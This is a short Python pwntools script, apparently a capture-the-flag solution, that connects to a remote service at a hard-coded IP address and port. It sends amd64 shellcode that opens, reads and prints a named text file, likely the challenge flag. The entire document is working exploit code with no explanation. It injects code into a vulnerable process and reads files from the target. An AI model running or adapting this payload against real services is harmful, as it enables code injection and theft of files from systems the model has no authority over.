from pwn import *


#p = process('./shellcode')

p = remote('45.122.249.68', '10017')

context.clear(arch='amd64', os='linux')

payload = asm('\n'.join([
    'mov rax, %d' % u64(b'.txt\0\0\0\0'),
    'push rax',
    'mov rax, %d' % u64(b'ongCoDon'),
    'push rax',
    'mov rax, %d' % u64(b'PhaPhaKh'),
    'push rax',

    'mov rax, 0x2',
    'mov rdi, rsp',
    'xor rsi, rsi',  # open
    'xor rdx, rdx',
    'syscall',

    'mov rcx, rax',
    'xor rax, rax',
    'mov rdi, rcx',  # read
    'mov rsi, rsp',
    'mov rdx, 0x50',
    'syscall',

    'mov rcx, rax',
    'mov rax, 0x1',
    'mov rdi, 0x1',  # write
    'mov rsi, rsp',
    'mov rdx, rcx',
    'syscall'
]))

p.sendline(payload)
p.interactive()